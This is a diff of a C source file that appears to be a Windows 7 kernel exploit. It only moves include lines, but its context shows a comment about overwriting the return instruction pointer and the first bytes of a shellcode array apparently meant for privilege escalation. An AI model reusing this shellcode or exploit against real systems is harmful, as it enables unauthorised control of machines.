@@ -1,7 +1,4 @@
-#include "stdafx.h"
-#include <Windows.h>
-#include <string.h>
-#include <stdio.h>
+
 
 /*
 
@@ -63,6 +60,11 @@ to overwrite the return instruction pointer (rip) & getting full control over th
 
 
 */
+
+#include "stdafx.h"
+#include <Windows.h>
+#include <string.h>
+#include <stdio.h>
 
 unsigned char win7x86pl[] = {
 	0x60, 0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x40, 0x50, 0x89, 0xC1,
